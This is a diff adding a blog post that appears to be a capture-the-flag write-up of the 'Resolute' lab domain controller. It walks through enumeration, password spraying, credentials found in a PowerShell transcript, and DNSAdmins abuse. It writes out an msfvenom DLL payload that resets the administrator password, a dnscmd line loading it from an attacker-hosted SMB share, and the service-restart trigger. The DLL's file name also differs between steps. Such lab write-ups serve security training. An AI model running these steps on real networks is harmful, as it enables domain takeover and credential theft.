@@ -1,0 +1,210 @@
+<h3 id="summary">Summary</h3>
+<ul>
+  <li>A <strong>Domain controller</strong> box. We first retrieve information about all users using <code class="language-plaintext highlighter-rouge">rpcclient</code> and find <strong>a password in the description field</strong> of one user which doesn’t work.</li>
+  <li>We <em>reuse</em> that password and <strong>spray all domain users</strong> and we get <strong>access to another user who has PowerShell remoting privileges</strong>.</li>
+  <li><em>Browsing the file system,</em> we find a <strong>PowerShell transcript file</strong> with <strong>credentials for another user</strong> in a hidden folder.</li>
+  <li>The other user is a <strong>member of the DNSAdmins AD Group</strong> which can gain <strong>system privilges</strong> on the machine by means of <strong>DLL Injection</strong>.</li>
+</ul>
+
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<p>As usual we start with regular nmap with <code class="language-plaintext highlighter-rouge">-sC</code> for default scripts and <code class="language-plaintext highlighter-rouge">-sV</code> to enumerate versions and making sure to include all ports with <code class="language-plaintext highlighter-rouge">-p-</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE  SERVICE      VERSION
+53/tcp    open   domain       Simple DNS Plus
+88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-22 17:53:31Z)
+135/tcp   open   msrpc        Microsoft Windows RPC
+139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+464/tcp   open   kpasswd5?
+593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open   tcpwrapped
+3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3269/tcp  open   tcpwrapped
+5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open   mc-nmf       .NET Message Framing
+47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open   msrpc        Microsoft Windows RPC
+49665/tcp open   msrpc        Microsoft Windows RPC
+49666/tcp open   msrpc        Microsoft Windows RPC
+49667/tcp open   msrpc        Microsoft Windows RPC
+49671/tcp open   msrpc        Microsoft Windows RPC
+49674/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49675/tcp open   msrpc        Microsoft Windows RPC
+49680/tcp open   msrpc        Microsoft Windows RPC
+49712/tcp open   msrpc        Microsoft Windows RPC
+50231/tcp closed unknown
+50274/tcp open   unknown
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h27m00s, deviation: 4h02m29s, median: 6m59s
+| smb2-time: 
+|   date: 2022-04-22T17:54:26
+|_  start_date: 2022-04-22T17:39:18
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Resolute
+|   NetBIOS computer name: RESOLUTE\x00
+|   Domain name: megabank.local
+|   Forest name: megabank.local
+|   FQDN: Resolute.megabank.local
+|_  System time: 2022-04-22T10:54:23-07:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+</code></pre></div></div>
+
+<h3 id="domain-controller-detection-host-information--finding-a-remote-administration-port">Domain Controller Detection, Host Information &amp; Finding a remote administration port</h3>
+<p><em>Looking at the results,</em> we find a combination of ports that indicate a domain controller:</p>
+<ol>
+  <li>DNS on 53</li>
+  <li>Kerberos on 88</li>
+  <li>LDAP on 389 &amp; LDAPS on 636</li>
+  <li>SMB on 445</li>
+</ol>
+
+<p>and we also find <em>WinRM</em> on 5985 which would be handy in getting a <strong>shell</strong> <em>if we manage to get a user that’s in</em> <strong>Windows Remote Management</strong> <em>group.</em></p>
+
+<p>We also find out from the <strong>nmap script</strong> that the operating system is <strong>Windows Server 2016 Standard 14393</strong> and that the domain name is <strong>megabank.local</strong> and that the computer name is <strong>Resolute.</strong></p>
+
+<h3 id="setting-up-our-dns">Setting up our DNS</h3>
+<p>we add this computer to our <code class="language-plaintext highlighter-rouge">/etc/resolv.conf</code> to make usage of tools like <code class="language-plaintext highlighter-rouge">impacket</code> easier.</p>
+
+<p><img src="/assets/Resolute/etc-resolv-conf.jpg" alt="etc-resolv-conf" /></p>
+
+<h3 id="smb-share-enumeration-as-nullanonymous">SMB share enumeration as Null/Anonymous</h3>
+<p>enumerating shares using multiple options doesn’t give us any results:</p>
+
+<p><img src="/assets/Resolute/smb-enum.jpg" alt="smb-enum" /></p>
+
+<h3 id="enumerating-rpc-with-rpcclient">Enumerating RPC with <code class="language-plaintext highlighter-rouge">rpcclient</code></h3>
+<p><em>using</em> <code class="language-plaintext highlighter-rouge">rpcclient</code> <em>with a blank user</em> <code class="language-plaintext highlighter-rouge">-U ''</code> <em>and the</em> <code class="language-plaintext highlighter-rouge">-N</code> <em>flag for no password</em>, we get a bunch of users with <code class="language-plaintext highlighter-rouge">enumdomusers</code></p>
+
+<p><img src="/assets/Resolute/enum-dom-users.jpg" alt="enum-dom-users" /></p>
+
+<p>we get more details using <code class="language-plaintext highlighter-rouge">querydispinfo2</code></p>
+
+<p><img src="/assets/Resolute/querydispinfo2.jpg" alt="querydispinfo2" /></p>
+
+<p><em>looking at the description for the</em> <code class="language-plaintext highlighter-rouge">marko</code> <em>user,</em> we see written: <code class="language-plaintext highlighter-rouge">Account created. Password set to Welcome123!</code>. We immediately try to login as that user but it doesn’t work :/</p>
+
+<p><img src="/assets/Resolute/marko-failed.jpg" alt="marko-failed" /></p>
+
+<h3 id="who-else-is-using-that-password">Who else is using that password?</h3>
+<p><em>having got an idea of a possible password,</em> a good logical step is to try that against the entire domain. we put what we got from <code class="language-plaintext highlighter-rouge">rpcclient &gt; enumdomusers</code> into a text file <code class="language-plaintext highlighter-rouge">users.txt</code> and use <code class="language-plaintext highlighter-rouge">crackmapexec</code> to do a <strong>Password Spray.</strong></p>
+
+<p><img src="/assets/Resolute/got-melanie.jpg" alt="got-melanie" /></p>
+
+<p><strong>We’re lucky! :D</strong> the <code class="language-plaintext highlighter-rouge">melanie</code> user authenticated.</p>
+
+<h3 id="options-available-after-getting-a-valid-ad-user">Options available after getting a valid AD user</h3>
+
+<p><em>Having a valid AD user,</em> we got a couple of things to check:</p>
+<ol>
+  <li><strong>Code execution with WinRM:</strong> Check</li>
+</ol>
+
+<p><img src="/assets/Resolute/melanie-got-winrm.jpg" alt="melanie-got-winrm" /></p>
+
+<ol>
+  <li><strong>SMB Shares:</strong> Nothing there but we can enumerate GPP</li>
+</ol>
+
+<p><img src="/assets/Resolute/melanie-smb-access.jpg" alt="melanie-smb-access" /></p>
+
+<ol>
+  <li><strong>GPP Enumeration</strong> (<em>since it’s a domain controller</em>)</li>
+</ol>
+
+<p><img src="/assets/Resolute/GPP-check.jpg" alt="GPP-check" /></p>
+
+<ol>
+  <li><strong>ASREPRoast</strong> (<em>could be done without creds but we moved down the password spray path first</em>):  No results</li>
+</ol>
+
+<p><img src="/assets/Resolute/asreproast.jpg" alt="asreproast" /></p>
+
+<ol>
+  <li><strong>Kerberoasting:</strong> didn’t get results either</li>
+</ol>
+
+<p><img src="/assets/Resolute/Kerberoast.jpg" alt="Kerberoast" /></p>
+
+<ol>
+  <li><strong>BloodHound:</strong> <em>With remote code execution using</em> <strong>WinRM</strong>, we decide to run <code class="language-plaintext highlighter-rouge">SharpHound.exe</code> from the shell</li>
+</ol>
+
+<p><img src="/assets/Resolute/sharphound-collection.jpg" alt="sharphound-collection" /></p>
+
+<h3 id="browsing-bloodhound-output">Browsing Bloodhound output</h3>
+<p><em>After browsing</em> <code class="language-plaintext highlighter-rouge">bloodhound</code> <em>for a while</em>, we find that we would have a clear path to Domain Admin if we manage to get the <code class="language-plaintext highlighter-rouge">ryan</code> user. This is because he is a member of the DNS Admins group which can be abused to elevate our privileges. He’s also a member of <strong>Remote Management Users</strong> and that means we can execute code using <strong>WinRM</strong> too.</p>
+
+<p><img src="/assets/Resolute/ryan-should-takeover.jpg" alt="ryan-should-takeover" /></p>
+
+<p>But we don’t have him as of the moment. So we look around the file system to see if we can find something to help us.</p>
+
+<h3 id="finding-creds-in-hidden-folders">Finding Creds in Hidden Folders</h3>
+<p><em>Looking around the</em> <code class="language-plaintext highlighter-rouge">C:</code> <em>drive</em>, we find the creds of the <code class="language-plaintext highlighter-rouge">ryan</code> user in <code class="language-plaintext highlighter-rouge">c:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</code></p>
+
+<p><img src="/assets/Resolute/transcript-found.jpg" alt="transcript-found" /></p>
+
+<p><img src="/assets/Resolute/ryan-creds-found.jpg" alt="ryan-creds-found" /></p>
+
+<p>The creds turn out to be valid and we get a shell as the <code class="language-plaintext highlighter-rouge">ryan</code> user</p>
+
+<p><img src="/assets/Resolute/shell-as-ryan.jpg" alt="shell-as-ryan" /></p>
+
+<h3 id="dnsadmins-abuse">DNSAdmins Abuse</h3>
+<p><em>Using</em> <strong>Google</strong>, we come across an excellent article from <strong>Ired.team</strong> website (https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise) fully explaining the a way we can exploit <code class="language-plaintext highlighter-rouge">ryan</code>’s’ membership in the <strong>DNSAdmins</strong> group to own the domain.</p>
+
+<p>We should need to compile a dll using <code class="language-plaintext highlighter-rouge">msfvenom</code> and configure the locally running <strong>DNS Service</strong> to load that dll <em>remotely</em> from our <strong>SMB share</strong>.</p>
+
+<p>we’re going to use a payload that doesn’t cause the <strong>DNS</strong> service to hang. It should be something simple like changing the the domain administrator’s password</p>
+
+<p><code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/exec cmd='net user administrator $$Y0uJustG0tOwn3d$$ /domain' -f dll &gt; owned.dll</code></p>
+
+<p><img src="/assets/Resolute/killer-dll.jpg" alt="killer-dll" /></p>
+
+<p>we then host it using <strong>Impacket’s</strong> <code class="language-plaintext highlighter-rouge">smbserver.py</code></p>
+
+<p><img src="/assets/Resolute/smb-server-up.jpg" alt="smb-server-up" /></p>
+
+<p><em>after that,</em> we’re going to reconfigure the <strong>DNS</strong> service using <code class="language-plaintext highlighter-rouge">dnscmd</code> with the <code class="language-plaintext highlighter-rouge">/config</code> flag along with <code class="language-plaintext highlighter-rouge">/serverlevelplugindll</code> pointing to our <strong>SMB</strong> share named <code class="language-plaintext highlighter-rouge">share</code>. It should be as below:</p>
+
+<p><code class="language-plaintext highlighter-rouge">dnscmd /config /serverlevelplugindll \\10.10.16.3\share\adduser.dll</code></p>
+
+<p>we can then trigger the execution by stopping the <strong>DNS</strong> service and restarting it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc.exe stop dns
+sc.exe start dns
+</code></pre></div></div>
+
+<p><img src="/assets/Resolute/dns-admins-abuse.jpg" alt="dns-admins-abuse" /></p>
+
+<p>we get a connect back on our <strong>SMB</strong> share and code execution occures giving us the <strong>Domain Admin</strong> in our hands</p>
+
+<p><img src="/assets/Resolute/got-domain-admin.jpg" alt="got-domain-admin" /></p>
+
+<h3 id="notes-and-pitfalls">Notes and pitfalls</h3>
+<ul>
+  <li>using the <code class="language-plaintext highlighter-rouge">sc</code> command without the <code class="language-plaintext highlighter-rouge">.exe</code> at the end didn’t work. This took me a while to figure out.</li>
+</ul>
+
+<p><img src="/assets/Resolute/troubleshooting-sc.jpg" alt="troubleshooting-sc" /></p>
+
+<ul>
+  <li>Also, copying the <code class="language-plaintext highlighter-rouge">msfvenom</code> generated locally on the machine dll didn’t work because the antivirus kept eating it up xD</li>
+</ul>
+
+<p><img src="/assets/Resolute/evil-dll-eaten.jpg" alt="evil-dll-eaten" /></p>
